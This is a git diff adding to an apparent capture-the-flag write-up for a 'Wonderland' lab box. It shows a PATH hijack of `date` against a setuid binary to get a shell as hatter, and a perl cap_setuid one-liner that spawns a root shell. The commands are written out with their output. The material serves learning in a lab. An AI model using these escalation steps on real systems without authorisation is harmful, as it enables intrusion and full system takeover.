@@ -216,6 +216,67 @@ teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV),
 rabbit@wonderland:/home/rabbit$
 ```
 
-after downloading the binary and opening it with binaryninja, I was able to recover the source code (you can find it [here]())
+after downloading the binary and opening it with binaryninja, I was able to recover the source code (you can find it [here](https://github.com/0x00Jeff/reversed_binaries/blob/master/tryhackme/teaParty.c))
 
-TLDR; it prints some stuff then executes a `bash` command using `system(3)` function
+TLDR; it sets the effective user and group id to 1003, which belong the `hatter`, this way we can spawn a shell as that suer, it then prints some stuff and executes the following `bash` command using `system(3)` function
+
+```bash
+/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R
+```
+you can see that `date` wasn't invoked with its absolute path, knowing this information we can make a fake `date` executable then alter the `$PATH` variable so the teaParty executee our version of `date`
+
+```bash
+rabbit@wonderland:/home/rabbit$ cd ../rabbit/
+rabbit@wonderland:/home/rabbit$ echo "bash -p" > date
+rabbit@wonderland:/home/rabbit$ chmod +x date 
+rabbit@wonderland:/home/rabbit$ export PATH="$PWD:$PATH"
+rabbit@wonderland:/home/rabbit$ ./teaParty 
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by hatter@wonderland:/home/rabbit$ whoami
+hatter
+hatter@wonderland:/home/rabbit$
+```
+
+### gaining root privileges
+
+`hatter`'s home directory didn't have anything useful for us, there was a file there that conatains the some kind of password, I tried using it to login as `root`
+without any sucess, and I after a while it turned out to be `hatter`'s ssh credentiels, it didn't do us any good as `hatter` didn't have the permission to execute commands with sudo
+
+```bash
+hatter@wonderland:/home/rabbit$ cd ../hatter/
+hatter@wonderland:/home/hatter$ ls -a
+.  ..  .bash_history  .bash_logout  .bashrc  .local  .profile  password.txt
+hatter@wonderland:/home/hatter$ cat password.txt 
+[REDACTED PASSWRD]
+hatter@wonderland:/home/hatter$ sudo -l
+[sudo] password for hatter: 
+Sorry, user hatter may not run sudo on wonderland.
+hatter@wonderland:/home/hatter$
+```
+
+at this point I've enumerated for quite some time again but I hit a wall for the second time, couple hours passsed and I've decided to peak at a write up again, I found out that I should look for files with `capabilities(7)`, again something little obvious. but I probably wouldn't have known it since even tho I always heard of such thing, I never interacted with it
+
+after some diging around I found a utlity called `getccap` that displays files with special capabilites, you can read it's man page to know more about it
+
+```bash
+hatter@wonderland:/home/hatter$ getcap -r / 2> /dev/null 
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep 
+hatter@wonderland:/home/hatter$ ls -lh /usr/bin/perl5.26.1 /usr/bin/perl
+-rwxr-xr-- 2 root hatter 2.1M Nov 19  2018 /usr/bin/perl
+-rwxr-xr-- 2 root hatter 2.1M Nov 19  2018 /usr/bin/perl5.26.1
+```
+
+after looking up those executables in [gtfo bins](https://gtfobins.github.io/) I found a command I can use to spawn a root shell, and it worked on one of the binaries!
+
+```bash
+hatter@wonderland:/home/hatter$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+bash: /usr/bin/perl: Permission denied
+hatter@wonderland:/home/hatter$ /usr/bin/perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+$ whoami
+root
+$
+```
+### I'm groot
